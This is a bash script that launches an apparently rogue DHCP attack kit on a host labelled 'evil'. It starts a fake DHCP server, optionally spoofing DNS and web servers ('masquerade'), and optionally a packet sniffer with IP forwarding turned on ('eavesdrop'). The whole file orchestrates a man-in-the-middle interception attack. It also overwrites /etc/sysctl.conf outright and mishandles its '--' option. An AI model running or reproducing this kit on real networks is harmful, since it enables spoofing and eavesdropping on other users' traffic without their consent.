#!/bin/bash

if [ -z "$1" ]; then
	echo "Usage: $0 interface [OPTION]
Interface:
	the interface on which to get Internet access, e.g. eth0
OPTION:
	-m - Enable masquarade
	-e - Enable eavesdrop"
	exit 1
fi
iface="$1"

masq=''
eve=''
while [ -n "$1" ]; do
	case "$1" in
		-m) masq='-m' ;;
		-e) eve='-e' ;;
		--) iface="$1" ;;
	esac
	shift
done

ip=$(/sbin/ifconfig "$iface" | grep 'inet addr:' | cut -d: -f2| cut -d' ' -f1)

host="host: evil"

dhcp_server_title="${host} - dhcp server"
xterm -T "$dhcp_server_title" -n "$dhcp_server_title" -e bash -c "python dhcp_server.py ${iface} ${ip} ${masq} ${eve}; bash" &

if [ -n "$masq" ]; then
	dns_server_title="${host} - dns server"
	web_server_title="${host} - web server"
	xterm -T "$dns_server_title" -n "$dns_server_title" -e bash -c "sudo ./dns_server.sh ${ip}; bash" &
	xterm -T "$web_server_title" -n "$web_server_title" -e bash -c "sudo python web_server.py ${ip}; bash" &
fi

if [ -n "$eve" ]; then
	echo 'net.ipv4.ip_forward = 1' > /etc/sysctl.conf
	sysctl -p /etc/sysctl.conf
	sniffer_title="${host} - sniffer"
	xterm -T "$sniffer_title" -n "$sniffer_title" -e bash -c "python sniff.py ${iface}; bash" &
fi
